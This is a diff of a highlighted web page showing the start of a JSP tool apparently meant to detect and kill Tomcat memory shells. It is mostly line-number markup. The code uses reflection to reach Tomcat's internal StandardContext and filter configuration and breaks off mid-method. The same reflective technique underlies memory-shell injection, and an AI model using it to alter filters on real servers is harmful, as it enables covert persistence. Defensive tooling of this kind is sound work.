+&lt;/span&gt;&lt;span class="lnt"&gt;106
+&lt;/span&gt;&lt;span class="lnt"&gt;107
+&lt;/span&gt;&lt;span class="lnt"&gt;108
+&lt;/span&gt;&lt;span class="lnt"&gt;109
+&lt;/span&gt;&lt;span class="lnt"&gt;110
+&lt;/span&gt;&lt;span class="lnt"&gt;111
+&lt;/span&gt;&lt;span class="lnt"&gt;112
+&lt;/span&gt;&lt;span class="lnt"&gt;113
+&lt;/span&gt;&lt;span class="lnt"&gt;114
+&lt;/span&gt;&lt;span class="lnt"&gt;115
+&lt;/span&gt;&lt;span class="lnt"&gt;116
+&lt;/span&gt;&lt;span class="lnt"&gt;117
+&lt;/span&gt;&lt;span class="lnt"&gt;118
+&lt;/span&gt;&lt;span class="lnt"&gt;119
+&lt;/span&gt;&lt;span class="lnt"&gt;120
+&lt;/span&gt;&lt;span class="lnt"&gt;121
+&lt;/span&gt;&lt;span class="lnt"&gt;122
+&lt;/span&gt;&lt;span class="lnt"&gt;123
+&lt;/span&gt;&lt;span class="lnt"&gt;124
+&lt;/span&gt;&lt;span class="lnt"&gt;125
+&lt;/span&gt;&lt;span class="lnt"&gt;126
+&lt;/span&gt;&lt;span class="lnt"&gt;127
+&lt;/span&gt;&lt;span class="lnt"&gt;128
+&lt;/span&gt;&lt;span class="lnt"&gt;129
+&lt;/span&gt;&lt;span class="lnt"&gt;130
+&lt;/span&gt;&lt;span class="lnt"&gt;131
+&lt;/span&gt;&lt;span class="lnt"&gt;132
+&lt;/span&gt;&lt;span class="lnt"&gt;133
+&lt;/span&gt;&lt;span class="lnt"&gt;134
+&lt;/span&gt;&lt;span class="lnt"&gt;135
+&lt;/span&gt;&lt;span class="lnt"&gt;136
+&lt;/span&gt;&lt;span class="lnt"&gt;137
+&lt;/span&gt;&lt;span class="lnt"&gt;138
+&lt;/span&gt;&lt;span class="lnt"&gt;139
+&lt;/span&gt;&lt;span class="lnt"&gt;140
+&lt;/span&gt;&lt;span class="lnt"&gt;141
+&lt;/span&gt;&lt;span class="lnt"&gt;142
+&lt;/span&gt;&lt;span class="lnt"&gt;143
+&lt;/span&gt;&lt;span class="lnt"&gt;144
+&lt;/span&gt;&lt;span class="lnt"&gt;145
+&lt;/span&gt;&lt;span class="lnt"&gt;146
+&lt;/span&gt;&lt;span class="lnt"&gt;147
+&lt;/span&gt;&lt;span class="lnt"&gt;148
+&lt;/span&gt;&lt;span class="lnt"&gt;149
+&lt;/span&gt;&lt;span class="lnt"&gt;150
+&lt;/span&gt;&lt;span class="lnt"&gt;151
+&lt;/span&gt;&lt;span class="lnt"&gt;152
+&lt;/span&gt;&lt;span class="lnt"&gt;153
+&lt;/span&gt;&lt;span class="lnt"&gt;154
+&lt;/span&gt;&lt;span class="lnt"&gt;155
+&lt;/span&gt;&lt;span class="lnt"&gt;156
+&lt;/span&gt;&lt;span class="lnt"&gt;157
+&lt;/span&gt;&lt;span class="lnt"&gt;158
+&lt;/span&gt;&lt;span class="lnt"&gt;159
+&lt;/span&gt;&lt;span class="lnt"&gt;160
+&lt;/span&gt;&lt;span class="lnt"&gt;161
+&lt;/span&gt;&lt;span class="lnt"&gt;162
+&lt;/span&gt;&lt;span class="lnt"&gt;163
+&lt;/span&gt;&lt;span class="lnt"&gt;164
+&lt;/span&gt;&lt;span class="lnt"&gt;165
+&lt;/span&gt;&lt;span class="lnt"&gt;166
+&lt;/span&gt;&lt;span class="lnt"&gt;167
+&lt;/span&gt;&lt;span class="lnt"&gt;168
+&lt;/span&gt;&lt;span class="lnt"&gt;169
+&lt;/span&gt;&lt;span class="lnt"&gt;170
+&lt;/span&gt;&lt;span class="lnt"&gt;171
+&lt;/span&gt;&lt;span class="lnt"&gt;172
+&lt;/span&gt;&lt;span class="lnt"&gt;173
+&lt;/span&gt;&lt;span class="lnt"&gt;174
+&lt;/span&gt;&lt;span class="lnt"&gt;175
+&lt;/span&gt;&lt;span class="lnt"&gt;176
+&lt;/span&gt;&lt;span class="lnt"&gt;177
+&lt;/span&gt;&lt;span class="lnt"&gt;178
+&lt;/span&gt;&lt;span class="lnt"&gt;179
+&lt;/span&gt;&lt;span class="lnt"&gt;180
+&lt;/span&gt;&lt;span class="lnt"&gt;181
+&lt;/span&gt;&lt;span class="lnt"&gt;182
+&lt;/span&gt;&lt;span class="lnt"&gt;183
+&lt;/span&gt;&lt;span class="lnt"&gt;184
+&lt;/span&gt;&lt;span class="lnt"&gt;185
+&lt;/span&gt;&lt;span class="lnt"&gt;186
+&lt;/span&gt;&lt;span class="lnt"&gt;187
+&lt;/span&gt;&lt;span class="lnt"&gt;188
+&lt;/span&gt;&lt;span class="lnt"&gt;189
+&lt;/span&gt;&lt;span class="lnt"&gt;190
+&lt;/span&gt;&lt;span class="lnt"&gt;191
+&lt;/span&gt;&lt;span class="lnt"&gt;192
+&lt;/span&gt;&lt;span class="lnt"&gt;193
+&lt;/span&gt;&lt;span class="lnt"&gt;194
+&lt;/span&gt;&lt;span class="lnt"&gt;195
+&lt;/span&gt;&lt;span class="lnt"&gt;196
+&lt;/span&gt;&lt;span class="lnt"&gt;197
+&lt;/span&gt;&lt;span class="lnt"&gt;198
+&lt;/span&gt;&lt;span class="lnt"&gt;199
+&lt;/span&gt;&lt;span class="lnt"&gt;200
+&lt;/span&gt;&lt;span class="lnt"&gt;201
+&lt;/span&gt;&lt;span class="lnt"&gt;202
+&lt;/span&gt;&lt;span class="lnt"&gt;203
+&lt;/span&gt;&lt;span class="lnt"&gt;204
+&lt;/span&gt;&lt;span class="lnt"&gt;205
+&lt;/span&gt;&lt;span class="lnt"&gt;206
+&lt;/span&gt;&lt;span class="lnt"&gt;207
+&lt;/span&gt;&lt;span class="lnt"&gt;208
+&lt;/span&gt;&lt;span class="lnt"&gt;209
+&lt;/span&gt;&lt;span class="lnt"&gt;210
+&lt;/span&gt;&lt;span class="lnt"&gt;211
+&lt;/span&gt;&lt;span class="lnt"&gt;212
+&lt;/span&gt;&lt;span class="lnt"&gt;213
+&lt;/span&gt;&lt;span class="lnt"&gt;214
+&lt;/span&gt;&lt;span class="lnt"&gt;215
+&lt;/span&gt;&lt;span class="lnt"&gt;216
+&lt;/span&gt;&lt;span class="lnt"&gt;217
+&lt;/span&gt;&lt;span class="lnt"&gt;218
+&lt;/span&gt;&lt;span class="lnt"&gt;219
+&lt;/span&gt;&lt;span class="lnt"&gt;220
+&lt;/span&gt;&lt;span class="lnt"&gt;221
+&lt;/span&gt;&lt;span class="lnt"&gt;222
+&lt;/span&gt;&lt;span class="lnt"&gt;223
+&lt;/span&gt;&lt;span class="lnt"&gt;224
+&lt;/span&gt;&lt;span class="lnt"&gt;225
+&lt;/span&gt;&lt;span class="lnt"&gt;226
+&lt;/span&gt;&lt;span class="lnt"&gt;227
+&lt;/span&gt;&lt;span class="lnt"&gt;228
+&lt;/span&gt;&lt;span class="lnt"&gt;229
+&lt;/span&gt;&lt;span class="lnt"&gt;230
+&lt;/span&gt;&lt;span class="lnt"&gt;231
+&lt;/span&gt;&lt;span class="lnt"&gt;232
+&lt;/span&gt;&lt;span class="lnt"&gt;233
+&lt;/span&gt;&lt;span class="lnt"&gt;234
+&lt;/span&gt;&lt;span class="lnt"&gt;235
+&lt;/span&gt;&lt;span class="lnt"&gt;236
+&lt;/span&gt;&lt;span class="lnt"&gt;237
+&lt;/span&gt;&lt;span class="lnt"&gt;238
+&lt;/span&gt;&lt;span class="lnt"&gt;239
+&lt;/span&gt;&lt;span class="lnt"&gt;240
+&lt;/span&gt;&lt;span class="lnt"&gt;241
+&lt;/span&gt;&lt;span class="lnt"&gt;242
+&lt;/span&gt;&lt;span class="lnt"&gt;243
+&lt;/span&gt;&lt;span class="lnt"&gt;244
+&lt;/span&gt;&lt;span class="lnt"&gt;245
+&lt;/span&gt;&lt;span class="lnt"&gt;246
+&lt;/span&gt;&lt;span class="lnt"&gt;247
+&lt;/span&gt;&lt;span class="lnt"&gt;248
+&lt;/span&gt;&lt;span class="lnt"&gt;249
+&lt;/span&gt;&lt;span class="lnt"&gt;250
+&lt;/span&gt;&lt;span class="lnt"&gt;251
+&lt;/span&gt;&lt;span class="lnt"&gt;252
+&lt;/span&gt;&lt;span class="lnt"&gt;253
+&lt;/span&gt;&lt;span class="lnt"&gt;254
+&lt;/span&gt;&lt;span class="lnt"&gt;255
+&lt;/span&gt;&lt;span class="lnt"&gt;256
+&lt;/span&gt;&lt;span class="lnt"&gt;257
+&lt;/span&gt;&lt;span class="lnt"&gt;258
+&lt;/span&gt;&lt;span class="lnt"&gt;259
+&lt;/span&gt;&lt;span class="lnt"&gt;260
+&lt;/span&gt;&lt;span class="lnt"&gt;261
+&lt;/span&gt;&lt;span class="lnt"&gt;262
+&lt;/span&gt;&lt;span class="lnt"&gt;263
+&lt;/span&gt;&lt;span class="lnt"&gt;264
+&lt;/span&gt;&lt;span class="lnt"&gt;265
+&lt;/span&gt;&lt;span class="lnt"&gt;266
+&lt;/span&gt;&lt;span class="lnt"&gt;267
+&lt;/span&gt;&lt;span class="lnt"&gt;268
+&lt;/span&gt;&lt;span class="lnt"&gt;269
+&lt;/span&gt;&lt;span class="lnt"&gt;270
+&lt;/span&gt;&lt;span class="lnt"&gt;271
+&lt;/span&gt;&lt;span class="lnt"&gt;272
+&lt;/span&gt;&lt;span class="lnt"&gt;273
+&lt;/span&gt;&lt;span class="lnt"&gt;274
+&lt;/span&gt;&lt;span class="lnt"&gt;275
+&lt;/span&gt;&lt;span class="lnt"&gt;276
+&lt;/span&gt;&lt;span class="lnt"&gt;277
+&lt;/span&gt;&lt;span class="lnt"&gt;278
+&lt;/span&gt;&lt;span class="lnt"&gt;279
+&lt;/span&gt;&lt;span class="lnt"&gt;280
+&lt;/span&gt;&lt;span class="lnt"&gt;281
+&lt;/span&gt;&lt;span class="lnt"&gt;282
+&lt;/span&gt;&lt;span class="lnt"&gt;283
+&lt;/span&gt;&lt;span class="lnt"&gt;284
+&lt;/span&gt;&lt;span class="lnt"&gt;285
+&lt;/span&gt;&lt;span class="lnt"&gt;286
+&lt;/span&gt;&lt;span class="lnt"&gt;287
+&lt;/span&gt;&lt;span class="lnt"&gt;288
+&lt;/span&gt;&lt;span class="lnt"&gt;289
+&lt;/span&gt;&lt;span class="lnt"&gt;290
+&lt;/span&gt;&lt;span class="lnt"&gt;291
+&lt;/span&gt;&lt;span class="lnt"&gt;292
+&lt;/span&gt;&lt;span class="lnt"&gt;293
+&lt;/span&gt;&lt;span class="lnt"&gt;294
+&lt;/span&gt;&lt;span class="lnt"&gt;295
+&lt;/span&gt;&lt;span class="lnt"&gt;296
+&lt;/span&gt;&lt;span class="lnt"&gt;297
+&lt;/span&gt;&lt;span class="lnt"&gt;298
+&lt;/span&gt;&lt;span class="lnt"&gt;299
+&lt;/span&gt;&lt;span class="lnt"&gt;300
+&lt;/span&gt;&lt;span class="lnt"&gt;301
+&lt;/span&gt;&lt;span class="lnt"&gt;302
+&lt;/span&gt;&lt;span class="lnt"&gt;303
+&lt;/span&gt;&lt;span class="lnt"&gt;304
+&lt;/span&gt;&lt;span class="lnt"&gt;305
+&lt;/span&gt;&lt;span class="lnt"&gt;306
+&lt;/span&gt;&lt;span class="lnt"&gt;307
+&lt;/span&gt;&lt;span class="lnt"&gt;308
+&lt;/span&gt;&lt;span class="lnt"&gt;309
+&lt;/span&gt;&lt;span class="lnt"&gt;310
+&lt;/span&gt;&lt;span class="lnt"&gt;311
+&lt;/span&gt;&lt;span class="lnt"&gt;312
+&lt;/span&gt;&lt;span class="lnt"&gt;313
+&lt;/span&gt;&lt;span class="lnt"&gt;314
+&lt;/span&gt;&lt;span class="lnt"&gt;315
+&lt;/span&gt;&lt;span class="lnt"&gt;316
+&lt;/span&gt;&lt;span class="lnt"&gt;317
+&lt;/span&gt;&lt;span class="lnt"&gt;318
+&lt;/span&gt;&lt;span class="lnt"&gt;319
+&lt;/span&gt;&lt;span class="lnt"&gt;320
+&lt;/span&gt;&lt;span class="lnt"&gt;321
+&lt;/span&gt;&lt;span class="lnt"&gt;322
+&lt;/span&gt;&lt;span class="lnt"&gt;323
+&lt;/span&gt;&lt;span class="lnt"&gt;324
+&lt;/span&gt;&lt;span class="lnt"&gt;325
+&lt;/span&gt;&lt;span class="lnt"&gt;326
+&lt;/span&gt;&lt;span class="lnt"&gt;327
+&lt;/span&gt;&lt;span class="lnt"&gt;328
+&lt;/span&gt;&lt;span class="lnt"&gt;329
+&lt;/span&gt;&lt;span class="lnt"&gt;330
+&lt;/span&gt;&lt;span class="lnt"&gt;331
+&lt;/span&gt;&lt;span class="lnt"&gt;332
+&lt;/span&gt;&lt;span class="lnt"&gt;333
+&lt;/span&gt;&lt;span class="lnt"&gt;334
+&lt;/span&gt;&lt;span class="lnt"&gt;335
+&lt;/span&gt;&lt;span class="lnt"&gt;336
+&lt;/span&gt;&lt;span class="lnt"&gt;337
+&lt;/span&gt;&lt;span class="lnt"&gt;338
+&lt;/span&gt;&lt;span class="lnt"&gt;339
+&lt;/span&gt;&lt;span class="lnt"&gt;340
+&lt;/span&gt;&lt;span class="lnt"&gt;341
+&lt;/span&gt;&lt;span class="lnt"&gt;342
+&lt;/span&gt;&lt;span class="lnt"&gt;343
+&lt;/span&gt;&lt;span class="lnt"&gt;344
+&lt;/span&gt;&lt;span class="lnt"&gt;345
+&lt;/span&gt;&lt;span class="lnt"&gt;346
+&lt;/span&gt;&lt;span class="lnt"&gt;347
+&lt;/span&gt;&lt;span class="lnt"&gt;348
+&lt;/span&gt;&lt;span class="lnt"&gt;349
+&lt;/span&gt;&lt;span class="lnt"&gt;350
+&lt;/span&gt;&lt;span class="lnt"&gt;351
+&lt;/span&gt;&lt;span class="lnt"&gt;352
+&lt;/span&gt;&lt;span class="lnt"&gt;353
+&lt;/span&gt;&lt;span class="lnt"&gt;354
+&lt;/span&gt;&lt;span class="lnt"&gt;355
+&lt;/span&gt;&lt;span class="lnt"&gt;356
+&lt;/span&gt;&lt;span class="lnt"&gt;357
+&lt;/span&gt;&lt;span class="lnt"&gt;358
+&lt;/span&gt;&lt;span class="lnt"&gt;359
+&lt;/span&gt;&lt;span class="lnt"&gt;360
+&lt;/span&gt;&lt;span class="lnt"&gt;361
+&lt;/span&gt;&lt;span class="lnt"&gt;362
+&lt;/span&gt;&lt;span class="lnt"&gt;363
+&lt;/span&gt;&lt;span class="lnt"&gt;364
+&lt;/span&gt;&lt;span class="lnt"&gt;365
+&lt;/span&gt;&lt;span class="lnt"&gt;366
+&lt;/span&gt;&lt;span class="lnt"&gt;367
+&lt;/span&gt;&lt;span class="lnt"&gt;368
+&lt;/span&gt;&lt;span class="lnt"&gt;369
+&lt;/span&gt;&lt;span class="lnt"&gt;370
+&lt;/span&gt;&lt;span class="lnt"&gt;371
+&lt;/span&gt;&lt;span class="lnt"&gt;372
+&lt;/span&gt;&lt;span class="lnt"&gt;373
+&lt;/span&gt;&lt;span class="lnt"&gt;374
+&lt;/span&gt;&lt;span class="lnt"&gt;375
+&lt;/span&gt;&lt;span class="lnt"&gt;376
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span class="o"&gt;&amp;lt;%--&lt;/span&gt;
+  &lt;span class="n"&gt;Created&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;IntelliJ&lt;/span&gt; &lt;span class="n"&gt;IDEA&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+  &lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ding&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;fugui&lt;/span&gt;
+  &lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;7&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;20&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;22&lt;/span&gt;
+  &lt;span class="n"&gt;Time&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;35&lt;/span&gt;
+  &lt;span class="n"&gt;To&lt;/span&gt; &lt;span class="n"&gt;change&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt; &lt;span class="n"&gt;template&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;Settings&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="n"&gt;Templates&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+&lt;span class="o"&gt;--%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;contentType&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;text/html;charset=UTF-8&amp;#34;&lt;/span&gt; &lt;span class="n"&gt;language&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.net.URL&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.lang.reflect.Field&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.util.HashMap&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;com.sun.org.apache.bcel.internal.Repository&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.net.URLEncoder&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.util.Map&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;org.apache.catalina.core.StandardWrapper&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.lang.reflect.Method&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.util.ArrayList&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.util.List&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.util.concurrent.CopyOnWriteArrayList&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;contentType&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;text/html;charset=UTF-8&amp;#34;&lt;/span&gt; &lt;span class="n"&gt;language&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;tomcat&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;memshell&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;killer&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;center&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;div&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class="o"&gt;&amp;lt;%!&lt;/span&gt;
+            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="nf"&gt;getStandardContext&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;NoSuchFieldException&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IllegalAccessException&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSession&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getServletContext&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;_context&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;context&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;_context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;appContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;__context&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;appContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;context&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;__context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;__context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;appContext&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;getFilterConfig&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getStandardContext&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
